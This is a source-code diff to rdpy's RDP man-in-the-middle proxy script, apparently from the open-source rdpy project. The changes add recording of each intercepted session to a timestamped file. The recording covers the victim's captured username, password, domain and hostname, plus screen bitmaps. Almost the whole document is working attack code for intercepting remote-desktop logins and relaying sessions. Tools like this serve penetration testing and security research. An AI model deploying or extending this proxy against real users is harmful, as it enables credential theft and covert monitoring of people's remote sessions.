@@ -1,6 +1,6 @@
 #!/usr/bin/python
 #
-# Copyright (c) 2014 Sylvain Peyrefitte
+# Copyright (c) 2014-2015 Sylvain Peyrefitte
 #
 # This file is part of rdpy.
 #
@@ -20,7 +20,8 @@
 
 """
 RDP proxy with Man in the middle capabilities
-Save bitmap in file and keylogging
+Save RDP events in output file in rsr file format
+RSR file format can be read by rdpy-rsrplayer.py
                ----------------------------
 Client RDP -> | ProxyServer | ProxyClient | -> Server RDP
               ----------------------------
@@ -40,24 +41,23 @@ class ProxyServer(rdp.RDPServerObserver):
     """
     @summary: Server side of proxy
     """
-    def __init__(self, controller, target):
+    def __init__(self, controller, target, rsrRecorder):
         """
         @param controller: {RDPServerController}
         @param target: {tuple(ip, port)}
+        @param rsrRecorder: {rsr.FileRecorder} use to record session
         """
         rdp.RDPServerObserver.__init__(self, controller)
         self._target = target
         self._client = None
-        self._close = False
+        self._rsr = rsrRecorder
     
-    def onClientReady(self, client):
+    def setClient(self, client):
         """
         @summary: Event throw by client when it's ready
         @param client: {ProxyClient}
         """
         self._client = client
-        #need to reevaluate color depth
-        self._controller.setColorDepth(self._client._controller.getColorDepth())
         
     def onReady(self):
         """
@@ -70,25 +70,21 @@ class ProxyServer(rdp.RDPServerObserver):
         if self._client is None:
             #try a connection
             domain, username, password = self._controller.getCredentials()
+            self._rsr.recInfo(username, password, domain, self._controller.getHostname())
             
             width, height = self._controller.getScreen()
+            self._rsr.recResize(width, height)
+            
             reactor.connectTCP(self._target[0], int(self._target[1]), ProxyClientFactory(self, width, height, 
                                                             domain, username, password))
-        else:
-            #refresh client
-            width, height = self._controller.getScreen()
-            self._client._controller.sendRefreshOrder(0, 0, width, height)
             
     def onClose(self):
         """
         @summary: Call when human client close connection
         @see: rdp.RDPServerObserver.onClose
         """
-        self._close = True
         if self._client is None:
             return
-        
-        #close proxy client
         self._client._controller.close()
         
     def onKeyEventScancode(self, code, isPressed):
@@ -130,7 +126,7 @@ class ProxyServerFactory(rdp.ServerFactory):
     """
     @summary: Factory on listening events
     """
-    def __init__(self, target, privateKeyFilePath = None, certificateFilePath = None):
+    def __init__(self, target, ouputDir, privateKeyFilePath = None, certificateFilePath = None):
         """
         @param target: {tuple(ip, prt)}
         @param privateKeyFilePath: {str} file contain server private key (if none -> back to standard RDP security)
@@ -138,7 +134,7 @@ class ProxyServerFactory(rdp.ServerFactory):
         """
         rdp.ServerFactory.__init__(self, 16, privateKeyFilePath, certificateFilePath)
         self._target = target
-        self._main = None
+        self._ouputDir = ouputDir
         
     def buildObserver(self, controller, addr):
         """
@@ -147,7 +143,7 @@ class ProxyServerFactory(rdp.ServerFactory):
         @see: rdp.ServerFactory.buildObserver
         """
         #first build main session
-        return ProxyServer(controller, self._target)
+        return ProxyServer(controller, self._target, rsr.createRecorder(os.path.join(self._ouputDir, "%s_%s.rsr"%(time.strftime('%Y%m%d%H%M%S'), addr.host))))
     
 class ProxyClient(rdp.RDPClientObserver):
     """
@@ -160,8 +156,6 @@ class ProxyClient(rdp.RDPClientObserver):
         """
         rdp.RDPClientObserver.__init__(self, controller)
         self._server = server
-        self._connected = False
-        self._rsr = rsr.createRecorder("/tmp/toto")
         
     def onReady(self):
         """
@@ -169,15 +163,9 @@ class ProxyClient(rdp.RDPClientObserver):
                     Inform ProxyServer that i'm connected
         @see: rdp.RDPClientObserver.onReady
         """
-        #prevent multiple on ready event
-        #because each deactive-reactive sequence 
-        #launch an onReady message
-        if self._connected:
-            return
-        else:
-            self._connected = True
-    
-        self._server.onClientReady(self)
+        self._server.setClient(self)
+        #maybe color depth change
+        self._server._controller.setColorDepth(self._controller.getColorDepth())
         
     def onClose(self):
         """
@@ -189,28 +177,18 @@ class ProxyClient(rdp.RDPClientObserver):
     def onUpdate(self, destLeft, destTop, destRight, destBottom, width, height, bitsPerPixel, isCompress, data):
         """
         @summary: Event use to inform bitmap update
-        @param destLeft: xmin position
-        @param destTop: ymin position
-        @param destRight: xmax position because RDP can send bitmap with padding
-        @param destBottom: ymax position because RDP can send bitmap with padding
-        @param width: width of bitmap
-        @param height: height of bitmap
-        @param bitsPerPixel: number of bit per pixel
-        @param isCompress: use RLE compression
-        @param data: bitmap data
+        @param destLeft: {int} xmin position
+        @param destTop: {int} ymin position
+        @param destRight: {int} xmax position because RDP can send bitmap with padding
+        @param destBottom: {int} ymax position because RDP can send bitmap with padding
+        @param width: {int} width of bitmap
+        @param height: {int} height of bitmap
+        @param bitsPerPixel: {int} number of bit per pixel
+        @param isCompress: {bool} use RLE compression
+        @param data: {str} bitmap data
         @see: rdp.RDPClientObserver.onUpdate
         """
-        e = rsr.UpdateEvent()
-        e.destLeft.value = destLeft
-        e.destTop.value = destTop
-        e.destRight.value = destRight
-        e.destBottom.value = destBottom
-        e.width.value = width
-        e.height.value = height
-        e.bpp.value = bitsPerPixel
-        e.format.value = rsr.UpdateFormat.BMP if isCompress else rsr.UpdateFormat.RAW
-        e.data.value = data
-        self._rsr.add(e)
+        self._server._rsr.recUpdate(destLeft, destTop, destRight, destBottom, width, height, bitsPerPixel, rsr.UpdateFormat.BMP if isCompress else rsr.UpdateFormat.RAW, data)
         self._server._controller.sendUpdate(destLeft, destTop, destRight, destBottom, width, height, bitsPerPixel, isCompress, data)
 
 class ProxyClientFactory(rdp.ClientFactory):
@@ -250,13 +228,13 @@ class ProxyClientFactory(rdp.ClientFactory):
         controller.setPassword(self._password)
         controller.setSecurityLevel(self._security)
         controller.setPerformanceSession()
-        return ProxyClient(controller, self._server)          
+        return ProxyClient(controller, self._server)
     
 def help():
     """
     @summary: Print help in console
     """
-    print "Usage: rdpy-rdpshare.py [-l listen_port default 3389] [-k private_key_file_path (mandatory for SSL)] [-c certificate_file_path (mandatory for SSL)] [-i admin_ip[:admin_port]] target"
+    print "Usage: rdpy-rdpmitm.py -o output_directory [-l listen_port default 3389] [-k private_key_file_path (mandatory for SSL)] [-c certificate_file_path (mandatory for SSL)] target"
 
 def parseIpPort(interface, defaultPort = "3389"):
     if ':' in interface:
@@ -268,9 +246,10 @@ if __name__ == '__main__':
     listen = "3389"
     privateKeyFilePath = None
     certificateFilePath = None
+    ouputDirectory = None
     
     try:
-        opts, args = getopt.getopt(sys.argv[1:], "hl:k:c:")
+        opts, args = getopt.getopt(sys.argv[1:], "hl:k:c:o:")
     except getopt.GetoptError:
         help()
     for opt, arg in opts:
@@ -283,6 +262,13 @@ if __name__ == '__main__':
             privateKeyFilePath = arg
         elif opt == "-c":
             certificateFilePath = arg
-    
-    reactor.listenTCP(int(listen), ProxyServerFactory(parseIpPort(args[0]), privateKeyFilePath, certificateFilePath))
+        elif opt == "-o":
+            ouputDirectory = arg
+            
+    if ouputDirectory is None or not os.path.dirname(ouputDirectory):
+        log.error("%s is an invalid output directory"%ouputDirectory)
+        help()
+        sys.exit()
+        
+    reactor.listenTCP(int(listen), ProxyServerFactory(parseIpPort(args[0]), ouputDirectory, privateKeyFilePath, certificateFilePath))
     reactor.run()
